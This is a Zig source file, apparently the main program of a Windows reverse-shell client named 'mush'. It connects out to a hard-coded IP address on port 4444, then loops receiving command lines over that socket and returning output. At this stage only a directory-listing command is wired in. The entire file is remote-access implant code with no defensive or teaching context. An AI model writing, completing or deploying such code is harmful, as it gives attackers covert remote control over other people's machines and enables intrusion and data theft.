const std = @import("std");
const WinSocket = @import("winsocket.zig");
const RemoteTty = @import("remotetty.zig");
const Commands = @import("commands/commands.zig");

const MushError = error{
    MushMissingCommand,
    MushInvalidCommand,
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    const address = try std.net.Address.parseIp("172.20.42.248", 4444);
    var winsock = try WinSocket.init(address);
    defer winsock.deinit();

    try winsock.connect();

    var rtty = try RemoteTty.init(&winsock, allocator);
    defer rtty.deinit();

    while (true) {
        const commandline = rtty.get_command_line() catch |err| {
            std.debug.print("Failed to get command line: {}\n", .{err});
            continue;
        };

        if (commandline.len > 0) {
            var args_iter = try std.process.ArgIteratorGeneral(.{ .comments = true }).init(allocator, commandline);

            const command = args_iter.next();
            if (command) |c| {
                std.debug.print("Got command: {s}\n", .{c});
            } else {
                try std.fmt.format(winsock, "[ERROR] No command provided: {any}\n", .{error.MushMissingCommand});
            }

            Commands.Ls(&args_iter, winsock) catch |err| {
                std.debug.print("Commands.Ls failed: {}\n", .{err});
            };

            args_iter.deinit();
        }

        allocator.free(commandline);
    }
}
